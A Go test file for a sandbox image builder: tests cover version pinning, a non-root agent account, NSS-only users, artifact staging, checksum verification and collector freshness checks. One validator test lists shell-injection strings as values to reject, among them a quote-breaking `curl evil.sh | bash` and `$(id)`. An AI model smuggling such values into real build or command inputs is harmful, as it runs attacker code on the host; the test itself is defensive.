package image

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"
)

// Build silently owns correctness properties that nothing else checks: the pinned Claude Code
// version, the non-root agent user, and the Files map keys matching what PostPushLayers later
// chmods. A typo in either half breaks the golden image with a failure that surfaces much later,
// inside a paid sandbox.

func stubRepo(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	for _, rel := range []string{beaconRelPath, collectorRelPath} {
		p := filepath.Join(root, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte("#!/bin/true\n"), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	return root
}

func TestBuildPinsClaudeVersion(t *testing.T) {
	spec, err := Build(Spec{RepoRoot: stubRepo(t)}, nil)
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(spec.Layers, "\n")

	if !strings.Contains(joined, "bash -s "+DefaultClaudeVersion) {
		t.Errorf("the installer must pin a version, or runs are not reproducible:\n%s", joined)
	}
	// An explicit version must win over the default.
	spec, err = Build(Spec{RepoRoot: stubRepo(t), ClaudeVersion: "9.9.9"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(strings.Join(spec.Layers, "\n"), "bash -s 9.9.9") {
		t.Error("explicit ClaudeVersion was not honoured")
	}
}

// Claude Code refuses --dangerously-skip-permissions as root, so the image must create and use
// an unprivileged account or every tool-using scenario fails.
func TestBuildCreatesNonRootAgentUser(t *testing.T) {
	spec, err := Build(Spec{RepoRoot: stubRepo(t)}, nil)
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(spec.Layers, "\n")

	// Matched on the command and the account rather than the exact flag string: the assertion is
	// that an unprivileged account gets created, not the order its options happen to appear in.
	if !strings.Contains(joined, "useradd") || !strings.Contains(joined, AgentUser) {
		t.Errorf("image must create the %s user:\n%s", AgentUser, joined)
	}
	if !strings.Contains(joined, "su - "+AgentUser+" -c 'curl -fsSL https://claude.ai/install.sh") {
		t.Errorf("Claude Code must be installed as %s, not root:\n%s", AgentUser, joined)
	}
	if AgentUser == "root" {
		t.Fatal("AgentUser must not be root")
	}
}

// The NSS-only lane exists to reproduce a directory-backed fleet, where an account resolves
// through getent but is absent from /etc/passwd. If the image ever creates that account with
// useradd anyway, the lane silently becomes an ordinary one and the scenario built on it reports
// that a bug is fixed when it was never exercised.
func TestBuildNSSOnlyUserDoesNotWriteEtcPasswd(t *testing.T) {
	spec, err := Build(Spec{RepoRoot: stubRepo(t), NSSOnlyUser: true}, nil)
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(spec.Layers, "\n")

	if strings.Contains(joined, "useradd") {
		t.Errorf("the NSS-only lane must not create a local account:\n%s", joined)
	}
	if !strings.Contains(joined, "libnss-extrausers") {
		t.Errorf("the NSS-only lane needs an NSS module to resolve through:\n%s", joined)
	}
	if !strings.Contains(joined, "/var/lib/extrausers/passwd") {
		t.Errorf("the account must live in the NSS database:\n%s", joined)
	}
	if !strings.Contains(joined, "extrausers") || !strings.Contains(joined, "/etc/nsswitch.conf") {
		t.Errorf("nsswitch must route passwd lookups through the NSS module:\n%s", joined)
	}
	// The image asserts its own property at build time; losing that check would let a broken NSS
	// module produce a lane that looks right and tests nothing.
	if !strings.Contains(joined, "getent passwd "+AgentUser) {
		t.Errorf("the image must verify getent resolves %s:\n%s", AgentUser, joined)
	}
	if !strings.Contains(joined, "/etc/passwd") {
		t.Errorf("the image must verify %s did not leak into /etc/passwd:\n%s", AgentUser, joined)
	}
}

// Both lanes must produce the same account identity, so a scenario comparing them is comparing
// visibility and nothing else.
func TestBothAccountLanesAgreeOnIdentity(t *testing.T) {
	local := strings.Join(accountLayers(false), "\n")
	nss := strings.Join(accountLayers(true), "\n")

	for _, want := range []string{AgentUser, AgentHome, fmt.Sprint(AgentUID)} {
		if !strings.Contains(local, want) {
			t.Errorf("local lane missing %q:\n%s", want, local)
		}
		if !strings.Contains(nss, want) {
			t.Errorf("NSS lane missing %q:\n%s", want, nss)
		}
	}
}

// PostPushLayers chmods and symlinks exactly the paths Build declares. If the two drift, the
// binaries land somewhere nothing makes executable.
func TestFilesMatchPostPushLayers(t *testing.T) {
	spec, err := Build(Spec{RepoRoot: stubRepo(t)}, nil)
	if err != nil {
		t.Fatal(err)
	}
	post := PostPushLayers()
	if len(spec.Files) == 0 {
		t.Fatal("expected artifact files in the spec")
	}
	for remote := range spec.Files {
		if !strings.Contains(post, remote) {
			t.Errorf("Files declares %q but PostPushLayers never chmods it:\n%s", remote, post)
		}
	}
	for _, want := range []string{BeaconDir + "/beacon", BeaconDir + "/beacon-otelcol"} {
		if _, ok := spec.Files[want]; !ok {
			t.Errorf("expected %q among the staged files, got %v", want, keys(spec.Files))
		}
	}
}

// Each staged binary must be the right local artifact, and the session PATH must reach where it
// lands and where the Claude installer puts claude. A swapped or empty source, or a PATH that
// misses either directory, still builds an image -- and every paid session then fails on
// "command not found" or runs the wrong binary.
func TestBuildStagesBothArtifactsWhereTheSessionPathFindsThem(t *testing.T) {
	root := stubRepo(t)
	spec, err := Build(Spec{RepoRoot: root}, nil)
	if err != nil {
		t.Fatal(err)
	}
	want := map[string]string{
		BeaconDir + "/beacon":         BeaconPath(root),
		BeaconDir + "/beacon-otelcol": CollectorPath(root),
	}
	for remote, local := range want {
		if got := spec.Files[remote]; got != local {
			t.Errorf("Files[%q] = %q, want the local artifact %q", remote, got, local)
		}
	}
	onPath := map[string]bool{}
	for _, dir := range LinuxLayout().PathPrepend {
		onPath[dir] = true
	}
	for remote := range spec.Files {
		if dir := remote[:strings.LastIndex(remote, "/")]; !onPath[dir] {
			t.Errorf("%s is staged in %s, which the session PATH %v does not reach", remote, dir, LinuxLayout().PathPrepend)
		}
	}
	if claudeBin := AgentHome + "/.local/bin"; !onPath[claudeBin] {
		t.Errorf("the session PATH %v misses %s, where the Claude installer puts claude", LinuxLayout().PathPrepend, claudeBin)
	}
}

// The error a first-time user is most likely to see must name the fix.
func TestArtifactsErrorNamesTheBuildCommand(t *testing.T) {
	root := t.TempDir()
	_, err := Artifacts(root, nil)
	if err == nil {
		t.Fatal("expected an error when the beacon binary is absent")
	}
	if !strings.Contains(err.Error(), BuildBeaconHint) {
		t.Errorf("error should tell the user how to build it, got: %v", err)
	}
	// Slash-normalized for the same reason as the guarded-path assertion: the error embeds a
	// filepath.Join'd path, so it renders with the host separator while beaconRelPath is written
	// with forward slashes.
	if !strings.Contains(filepath.ToSlash(err.Error()), beaconRelPath) {
		t.Errorf("error should name the missing path, got: %v", err)
	}
}

// A zero-byte file is what an interrupted build leaves behind. Treating it as present would
// surface as a confusing exec failure inside a paid sandbox instead of failing here.
func TestArtifactsRejectsEmptyBeaconBinary(t *testing.T) {
	root := stubRepo(t)
	if err := os.WriteFile(BeaconPath(root), nil, 0o755); err != nil {
		t.Fatal(err)
	}
	_, err := Artifacts(root, nil)
	if err == nil {
		t.Fatal("an empty beacon binary must be rejected")
	}
	if !strings.Contains(err.Error(), "empty") {
		t.Errorf("error should say the build did not complete, got: %v", err)
	}
	if !strings.Contains(err.Error(), BuildBeaconHint) {
		t.Errorf("error should name the rebuild command, got: %v", err)
	}
}

func TestCollectorIsStaleIgnoresACleanTree(t *testing.T) {
	// A directory that is not a git repo must not report staleness, or every non-git checkout
	// gets a spurious warning.
	stale, _ := CollectorIsStale(t.TempDir())
	if stale {
		t.Error("a non-git directory should not report exporter changes")
	}
}

func keys(m map[string]string) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

// The freshness check exists to prevent verifying the wrong binary. Its first version only looked
// at uncommitted git status, so a committed exporter change or a binary downloaded from an older
// release both read as fresh -- the exact false pass it claims to guard, and one that already cost
// a wasted investigation once. Cursor Bugbot flagged the gap. These pin the two added signals.

// The freshness tests all start from the same history: exp.go committed as "base", with or without
// a lightweight v1.0.6 release tag on it. Both repositories are built once per package run and
// every test works on its own copy, so the git spawns that dominate these tests are paid once.
var releaseRepos struct {
	once      sync.Once
	dir       string // holds "base" and "tagged"
	skip, err error
}

func TestMain(m *testing.M) {
	code := m.Run()
	if releaseRepos.dir != "" {
		os.RemoveAll(releaseRepos.dir)
	}
	os.Exit(code)
}

// hermeticGit isolates git from the developer's global and system config for the whole test, so
// the production git calls under test see the same isolation. A global tag.gpgSign, for instance,
// turns `git tag` into an annotated tag that needs a message; the release tags these tests model
// are plain lightweight tags.
func hermeticGit(t *testing.T) {
	t.Helper()
	cfg := filepath.Join(t.TempDir(), "gitconfig")
	writeFile(t, cfg, "")
	for k, v := range map[string]string{
		"GIT_CONFIG_GLOBAL":   cfg,
		"GIT_CONFIG_NOSYSTEM": "1",
		"GIT_AUTHOR_NAME":     "t",
		"GIT_AUTHOR_EMAIL":    "t@example.com",
		"GIT_COMMITTER_NAME":  "t",
		"GIT_COMMITTER_EMAIL": "t@example.com",
	} {
		t.Setenv(k, v)
	}
}

// releaseRepo returns this test's own copy of the release history, tagged v1.0.6 when tagged is
// set, and the path of its exporter source.
func releaseRepo(t *testing.T, tagged bool) (root, src string) {
	t.Helper()
	hermeticGit(t)
	releaseRepos.once.Do(buildReleaseRepos)
	if releaseRepos.skip != nil {
		t.Skipf("git unavailable: %v", releaseRepos.skip)
	}
	if releaseRepos.err != nil {
		t.Fatal(releaseRepos.err)
	}
	name := "base"
	if tagged {
		name = "tagged"
	}
	root = filepath.Join(t.TempDir(), "repo")
	if err := os.CopyFS(root, os.DirFS(filepath.Join(releaseRepos.dir, name))); err != nil {
		t.Fatal(err)
	}
	return root, filepath.Join(root, "collector-builder", "exporter", "exp.go")
}

func buildReleaseRepos() {
	dir, err := os.MkdirTemp("", "beacon-sandbox-image-")
	if err != nil {
		releaseRepos.err = err
		return
	}
	releaseRepos.dir = dir
	base, tagged := filepath.Join(dir, "base"), filepath.Join(dir, "tagged")
	if err := runGit(dir, "init", "-q", base); err != nil {
		releaseRepos.skip = err
		return
	}
	for _, d := range []string{filepath.Join(base, "collector-builder", "exporter"), filepath.Dir(CollectorPath(base))} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			releaseRepos.err = err
			return
		}
	}
	if err := os.WriteFile(filepath.Join(base, "collector-builder", "exporter", "exp.go"), []byte("package exp\n"), 0o644); err != nil {
		releaseRepos.err = err
		return
	}
	for _, step := range []func() error{
		func() error { return runGit(base, "add", "-A") },
		func() error { return runGit(base, "commit", "-qm", "base") },
		func() error { return os.CopyFS(tagged, os.DirFS(base)) },
		func() error { return runGit(tagged, "tag", "v1.0.6") },
	} {
		if err := step(); err != nil {
			releaseRepos.err = err
			return
		}
	}
}

func runGit(root string, args ...string) error {
	if out, err := exec.Command("git", append([]string{"-C", root}, args...)...).CombinedOutput(); err != nil {
		return fmt.Errorf("git %v: %v: %s", args, err, out)
	}
	return nil
}

func git(t *testing.T, root string, args ...string) {
	t.Helper()
	if err := runGit(root, args...); err != nil {
		t.Fatal(err)
	}
}

// commitAll makes the tree clean, so a test can isolate a freshness signal other than
// "uncommitted changes" -- which correctly fires first and would otherwise mask the rest.
func commitAll(t *testing.T, root, msg string) {
	t.Helper()
	git(t, root, "add", "-A")
	git(t, root, "commit", "-qm", msg)
}

func writeFile(t *testing.T, path, body string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

// A binary downloaded from a release must be reported stale once collector-builder/ has changed
// since that release, even though every change is committed and the tree is clean.
func TestDownloadedCollectorIsStaleAfterCommittedExporterChanges(t *testing.T) {
	root, src := releaseRepo(t, true)

	// The collector came from that release, recorded exactly as EnsureCollector would.
	writeFile(t, CollectorPath(root), "binary")
	if err := writeProvenance(root, "v1.0.6"); err != nil {
		t.Fatal(err)
	}

	// Clean tree at the release: nothing to warn about.
	if stale, why := CollectorIsStale(root); stale {
		t.Fatalf("at the release commit nothing has changed, got stale: %s", why)
	}

	// Now commit an exporter change. Tree is still clean, so the old check saw nothing.
	writeFile(t, src, "package exp\n// changed\n")
	commitAll(t, root, "change the exporter")

	stale, why := CollectorIsStale(root)
	if !stale {
		t.Fatal("a committed exporter change after the downloaded release must be reported stale")
	}
	if !strings.Contains(why, "v1.0.6") || !strings.Contains(why, "exp.go") {
		t.Errorf("the reason should name the release and the changed file, got %q", why)
	}
}

// A locally built binary older than its sources is stale even with a clean tree and no provenance.
func TestLocallyBuiltCollectorOlderThanSourcesIsStale(t *testing.T) {
	root, _ := releaseRepo(t, false) // clean tree, so only the mtime signal is under test
	writeFile(t, CollectorPath(root), "binary")
	// Backdate the binary so the source is unambiguously newer.
	old := time.Now().Add(-2 * time.Hour)
	if err := os.Chtimes(CollectorPath(root), old, old); err != nil {
		t.Fatal(err)
	}

	stale, why := CollectorIsStale(root)
	if !stale {
		t.Fatal("a binary older than its sources must be reported stale")
	}
	if !strings.Contains(why, "exp.go") {
		t.Errorf("the reason should name the newer source, got %q", why)
	}
}

// A freshly built binary must not warn, or the check becomes noise everyone learns to ignore.
func TestFreshLocalBuildIsNotStale(t *testing.T) {
	root, _ := releaseRepo(t, false) // clean tree, so only the mtime signal is under test
	// Built after the source.
	writeFile(t, CollectorPath(root), "binary")
	later := time.Now().Add(time.Minute)
	if err := os.Chtimes(CollectorPath(root), later, later); err != nil {
		t.Fatal(err)
	}

	if stale, why := CollectorIsStale(root); stale {
		t.Errorf("a binary newer than its sources is fresh, got stale: %s", why)
	}
}

// The whole point of the freshness warning is that doing what it asks clears it. A first version
// of provenance recorded only the release tag, and nothing cleared that marker on a local rebuild
// -- so CollectorIsStale kept reporting "downloaded from release X" forever and the warning could
// never be satisfied. A warning that cannot be cleared trains people to ignore it, which is worse
// than the false pass it replaced. Cursor Bugbot caught it.
func TestRebuildingLocallyClearsTheDownloadedProvenance(t *testing.T) {
	root, src := releaseRepo(t, true)

	// A downloaded binary, with provenance recorded exactly as EnsureCollector would.
	writeFile(t, CollectorPath(root), "downloaded-binary")
	if err := writeProvenance(root, "v1.0.6"); err != nil {
		t.Fatal(err)
	}

	// Commit an exporter change: the downloaded binary is now genuinely stale.
	writeFile(t, src, "package exp\n// changed\n")
	commitAll(t, root, "change the exporter")

	stale, why := CollectorIsStale(root)
	if !stale {
		t.Fatal("a downloaded binary predating a committed exporter change must be stale")
	}
	if !strings.Contains(why, "v1.0.6") {
		t.Errorf("expected the release-based reason, got %q", why)
	}

	// Now do exactly what the warning asks: rebuild locally. The marker is not touched, which is
	// the situation that made the warning permanent.
	writeFile(t, CollectorPath(root), "freshly-built-binary-with-different-size")
	later := time.Now().Add(time.Minute)
	if err := os.Chtimes(CollectorPath(root), later, later); err != nil {
		t.Fatal(err)
	}

	stale, why = CollectorIsStale(root)
	if stale {
		t.Errorf("a local rebuild must clear the warning, got stale: %s", why)
	}
}

// A marker from before identity was recorded cannot be validated, so it must not be trusted.
func TestLegacyProvenanceWithoutIdentityIsNotTrusted(t *testing.T) {
	root := stubRepo(t)
	writeFile(t, CollectorPath(root), "binary")
	writeFile(t, provenancePath(root), "release:v1.0.5\n")

	if _, state := recordedRelease(root); state == provenanceTrusted {
		t.Error("an unverifiable marker must not be trusted")
	}
}

// The version reaches a shell inside the image layer via single-quoted interpolation, so a value
// containing a quote would break the quoting and change what gets executed. A whitelist is used
// rather than an escaping scheme because rejecting an unexpected shape is easier to reason about
// than proving escaping is airtight. Reported by the Copilot reviewer.
func TestClaudeVersionRejectsAnythingButDottedNumerals(t *testing.T) {
	bad := []string{
		`2.1.220'; curl evil.sh | bash; echo '`, // the actual injection
		`2.1.220'`, `'`, `2.1.220 && whoami`, `$(id)`, "2.1.220\nRUN echo hi",
		`v2.1.220`, `latest`, `2..1`, `.2.1`, `2.1.`, ``,
	}
	for _, v := range bad {
		if _, err := Build(Spec{RepoRoot: t.TempDir(), ClaudeVersion: v}, nil); err == nil {
			t.Errorf("version %q must be rejected", v)
		} else if v != "" && !strings.Contains(err.Error(), "claude-version") {
			// An empty value legitimately falls back to the default and then fails on artifacts.
			t.Errorf("version %q should fail on validation, got: %v", v, err)
		}
	}
}

// Real versions must keep working, or pinning becomes impossible.
func TestClaudeVersionAcceptsRealVersions(t *testing.T) {
	root := t.TempDir()
	// Build fails later on missing artifacts; only the validation gate is under test here.
	for _, v := range []string{"2.1.220", "2.1.0", "10.20.30", "3"} {
		_, err := Build(Spec{RepoRoot: root, ClaudeVersion: v}, nil)
		if err != nil && strings.Contains(err.Error(), "claude-version") {
			t.Errorf("version %q should be accepted, got: %v", v, err)
		}
	}
}

// The collector binary is executed inside the sandbox, so accepting whatever the network returned
// would make a compromised proxy or mirror enough to run arbitrary code. Verification against the
// release's own checksums.txt is therefore mandatory, and a release without one must be refused
// rather than trusted. Reported by the Copilot reviewer.
func TestChecksumParsingSelectsTheRightEntry(t *testing.T) {
	body := "aaaa1111  beacon_1.0.6_darwin_arm64.tar.gz\n" +
		"bbbb2222  beacon_1.0.6_linux_amd64.tar.gz\n" +
		"cccc3333  threat-rules.tar.gz\n"
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte(body))
	}))
	defer srv.Close()

	got, err := expectedSHA256(srv.Client(), srv.URL, "beacon_1.0.6_linux_amd64.tar.gz")
	if err != nil {
		t.Fatal(err)
	}
	if got != "bbbb2222" {
		t.Errorf("digest = %q, want the linux_amd64 entry", got)
	}

	// A tarball with no entry cannot be verified, so it must error rather than pass.
	if _, err := expectedSHA256(srv.Client(), srv.URL, "beacon_1.0.6_linux_arm64.tar.gz"); err == nil {
		t.Error("a missing checksums entry must be an error, not an empty digest")
	}
}

// A mismatched digest must refuse to install the binary at all.
func TestDownloadRefusesAMismatchedChecksum(t *testing.T) {
	payload := []byte("this is not really a tarball")
	mux := http.NewServeMux()
	mux.HandleFunc("/tarball", func(w http.ResponseWriter, r *http.Request) { _, _ = w.Write(payload) })
	mux.HandleFunc("/checksums.txt", func(w http.ResponseWriter, r *http.Request) {
		// A digest that deliberately does not match the payload.
		_, _ = w.Write([]byte("0000000000000000000000000000000000000000000000000000000000000000  t.tar.gz\n"))
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	dst := filepath.Join(t.TempDir(), "dist", "beacon-otelcol")
	err := downloadCollector(releaseAsset{
		Version: "v1.0.6", Name: "t.tar.gz",
		URL: srv.URL + "/tarball", ChecksumsURL: srv.URL + "/checksums.txt",
	}, dst, func(string, ...any) {})

	if err == nil {
		t.Fatal("a mismatched checksum must refuse the download")
	}
	if !strings.Contains(err.Error(), "checksum mismatch") {
		t.Errorf("the error should name the mismatch, got: %v", err)
	}
	if _, statErr := os.Stat(dst); statErr == nil {
		t.Error("nothing must be installed when verification fails")
	}
}

// An unresolvable release tag must not read as "no drift". doctor --fix can record a tag the local
// clone does not have yet -- no `git fetch --tags`, or a release newer than the checkout -- and the
// old code turned that into a confident *fresh*, skipping the mtime fallback entirely. With exporter
// changes present, collector_freshness reported green and a run verified the wrong beacon-otelcol:
// exactly the false pass this check exists to prevent. Cursor Bugbot reported it as High.
func TestUnresolvableReleaseTagIsNotReportedFresh(t *testing.T) {
	root, _ := releaseRepo(t, false)

	writeFile(t, CollectorPath(root), "downloaded-binary")
	// Provenance names a release this clone has never seen.
	if err := writeProvenance(root, "v99.99.99"); err != nil {
		t.Fatal(err)
	}

	stale, why := CollectorIsStale(root)
	if !stale {
		t.Fatal("an unresolvable tag means drift is unknowable and must not report fresh")
	}
	for _, want := range []string{"v99.99.99", "cannot resolve"} {
		if !strings.Contains(why, want) {
			t.Errorf("the reason should explain the unresolvable tag, got %q", why)
		}
	}
	// And it must point at something the reader can actually do.
	if !strings.Contains(why, "fetch --tags") && !strings.Contains(why, "rebuild") {
		t.Errorf("the reason should suggest a remedy, got %q", why)
	}
}

// The false green Bugbot reported: a downloaded release binary whose provenance is absent or no
// longer describes it. CollectorIsStale then skipped release-drift detection and fell back to
// comparing mtimes -- and a downloaded binary is essentially always newer than local sources, so
// committed exporter changes since that release went unreported and the check went green while the
// run verified the wrong beacon-otelcol.
func TestUnprovenancedBinaryWithExporterDriftIsNotFresh(t *testing.T) {
	root, src := releaseRepo(t, true)
	// Exporter changes land after that release.
	writeFile(t, src, "package exp\n// the change under test\n")
	commitAll(t, root, "change the exporter")

	// A binary with no provenance at all, newer than the sources -- which is what a download
	// looks like, and also what a local build looks like. Origin is genuinely unknown.
	writeFile(t, CollectorPath(root), "binary-of-unknown-origin")
	later := time.Now().Add(time.Minute)
	if err := os.Chtimes(CollectorPath(root), later, later); err != nil {
		t.Fatal(err)
	}

	stale, why := CollectorIsStale(root)
	if !stale {
		t.Fatal("exporter drift since the last release plus an unknown origin cannot be called fresh")
	}
	for _, want := range []string{"v1.0.6", "origin is unrecorded", "exp.go"} {
		if !strings.Contains(why, want) {
			t.Errorf("the reason should name the release, the gap, and the file; got %q", why)
		}
	}
}

// The narrowing that keeps this off the common path: no exporter changes since the last release
// means an unprovenanced binary cannot be carrying stale exporter code, so no warning.
func TestUnprovenancedBinaryWithNoDriftStaysQuiet(t *testing.T) {
	root, _ := releaseRepo(t, true)
	writeFile(t, CollectorPath(root), "binary-of-unknown-origin")
	later := time.Now().Add(time.Minute)
	if err := os.Chtimes(CollectorPath(root), later, later); err != nil {
		t.Fatal(err)
	}

	if stale, why := CollectorIsStale(root); stale {
		t.Errorf("no exporter drift since the release means nothing to warn about, got: %s", why)
	}
}

// The Vector layer is what i04 exists to test, so a layer that installed the wrong build, or
// skipped its checks, would make that scenario verify something the packages do not ship. It is
// also appended only on request, so every other scenario keeps its cached image.
func TestBuildInstallsTheBundledVectorOnlyWhenAsked(t *testing.T) {
	spec, err := Build(Spec{RepoRoot: stubRepo(t)}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if joined := strings.Join(spec.Layers, "\n"); strings.Contains(joined, VectorPath) {
		t.Fatalf("Vector must not be installed unless a scenario asks for it:\n%s", joined)
	}

	spec, err = Build(Spec{RepoRoot: stubRepo(t), WithVector: true}, nil)
	if err != nil {
		t.Fatal(err)
	}
	var layer string
	for _, l := range spec.Layers {
		if strings.Contains(l, VectorPath) {
			layer = l
		}
	}
	if layer == "" {
		t.Fatal("WithVector added no layer that installs Vector")
	}
	for _, want := range []string{
		"vector-" + VectorVersion + "-x86_64-unknown-linux-musl.tar.gz",
		VectorSHA256 + "  vector-" + VectorVersion,
		"sha256sum -c -",
		"vector-" + VectorVersion + "-SHA256SUMS",
		"dynamically linked",
	} {
		if !strings.Contains(layer, want) {
			t.Errorf("the Vector layer is missing %q:\n%s", want, layer)
		}
	}
	if !strings.HasSuffix(layer, VectorPath+" --version") {
		t.Errorf("the layer must end by running Vector, so a bad binary fails the build:\n%s", layer)
	}
}

// The release packages check Vector against packaging/vector/, and this image against
// VectorSHA256. Both must name the same archive, or i04 tests a Vector the packages do not ship;
// a Vector bump that updates one pin and not the other fails here.
func TestVectorPinMatchesTheReleasePin(t *testing.T) {
	path := filepath.Join("..", "..", "packaging", "vector", "vector-"+VectorVersion+"-SHA256SUMS")
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("the release pins no checksums for Vector %s: %v", VectorVersion, err)
	}
	want := VectorSHA256 + "  vector-" + VectorVersion + "-x86_64-unknown-linux-musl.tar.gz"
	for _, line := range strings.Split(string(data), "\n") {
		if strings.TrimSpace(line) == want {
			return
		}
	}
	t.Fatalf("%s has no line %q:\n%s", path, want, data)
}
